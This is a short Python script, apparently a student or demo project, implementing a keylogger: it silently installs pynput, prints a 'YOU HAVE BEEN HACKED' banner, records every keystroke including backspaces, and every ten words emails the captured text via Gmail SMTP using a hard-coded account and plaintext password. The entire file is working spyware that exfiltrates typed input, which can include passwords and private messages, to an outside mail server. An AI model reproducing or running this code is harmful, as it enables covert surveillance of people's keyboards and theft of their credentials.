import sys #automatically install pynput
import subprocess #automatically install pynput
# script to install pynput (implement pip as a subprocess):
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 
'pynput==1.6.8'])
import pynput #used to keylog
import smtplib, ssl #used to send emails
from pynput.keyboard import Key, Listener



print("""

██    ██  ██████  ██    ██     ██   ██  █████  ██    ██ ███████     ██████  ███████ ███████ ███    ██     ██   ██  █████   ██████ ██   ██ ███████ ██████  
 ██  ██  ██    ██ ██    ██     ██   ██ ██   ██ ██    ██ ██          ██   ██ ██      ██      ████   ██     ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
  ████   ██    ██ ██    ██     ███████ ███████ ██    ██ █████       ██████  █████   █████   ██ ██  ██     ███████ ███████ ██      █████   █████   ██   ██ 
   ██    ██    ██ ██    ██     ██   ██ ██   ██  ██  ██  ██          ██   ██ ██      ██      ██  ██ ██     ██   ██ ██   ██ ██      ██  ██  ██      ██   ██ 
   ██     ██████   ██████      ██   ██ ██   ██   ████   ███████     ██████  ███████ ███████ ██   ████     ██   ██ ██   ██  ██████ ██   ██ ███████ ██████  
                                                                                                                                                          
                                                                                                                                                          
""")
words_per_line=0 #10 words and send email
final_string='' #string that sends to email

#email configuration
email='stuyhackerdemo@gmail.com' #email where logs will be sent
password='iamastuyvesanthacker123@' #password is iamastuyvesanthacker123@

port = 465  # For SSL
smtp_server = "smtp.gmail.com"
context = ssl.create_default_context()



#prints each keybard click
def keyboard_click(key):
    global final_string, words_per_line,email
    process_input(key)
    if words_per_line>=10:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(email, password) #log in to email
            server.sendmail(email, email, final_string) #sender email, receiver email, message
        final_string=''
        words_per_line=0




#If user clicks escape key, exit out of program
def exit(key):
    if key == Key.esc:
        return False


def process_input(key): #processing the pynput module
    global words_per_line, final_string
    char= str(key).replace("'","")
    if char=="Key.space":
        words_per_line+=1
        final_string+=" "
    elif char=="Key.enter":
        final_string+="\n"
    elif char=="Key.backspace":
        final_string+= (" BACKSPACE\n")
    elif char=="Key.ctrl_l" or char=="Key.shift":
        final_string+="" #write nothing if weird keys are entered
    else:
        final_string+=char


#runs keylog function
with Listener (on_press=keyboard_click, on_release=exit) as listener:
    listener.join()

